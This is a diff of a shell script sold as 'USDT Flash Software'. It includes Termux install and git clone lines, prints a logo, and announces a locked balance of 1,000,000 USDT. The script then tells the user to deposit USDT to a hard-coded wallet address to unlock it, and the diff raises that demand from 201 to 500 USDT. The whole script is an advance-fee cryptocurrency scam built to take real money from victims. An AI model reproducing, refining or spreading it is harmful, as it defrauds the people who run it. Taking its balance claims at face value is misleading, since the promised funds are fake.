@@ -2,7 +2,7 @@
 
 pkg install git && git clone https://github.com/vrifiedfxx/Usdt_Flash.git
 # cd Usdt_Flash && bash Usdt_Flash.sh
-    balance=1000000 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099" account_id="TQ8voWnkWkYc43qT3mV2XWBk2PBz8ULyM9usdt"_logo="
+    balance=1000000 hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099" account_id="TQ8voWnkWkYc43qT3mV2XWBk2PBz8ULyM9"_logo="
 \e[38;2;38;161;123m$$$$$$\
 $$  __$$\
 $$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\
@@ -23,7 +23,7 @@ function fancyBoxEcho {
 welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"
 echo -e "$usdt_logo"
 fancyBoxEcho "$welcome_message"
-        echo -e "To unlock your balance of $balance USDT, please deposit 201 USDT to the following address: $account_id"
+        echo -e "To unlock your balance of $balance USDT, please deposit 500 USDT to the following address: $account_id"
 function unlockBalance {
     echo " "
     read -p "Enter your deposit amount in USDT: " depositAmount
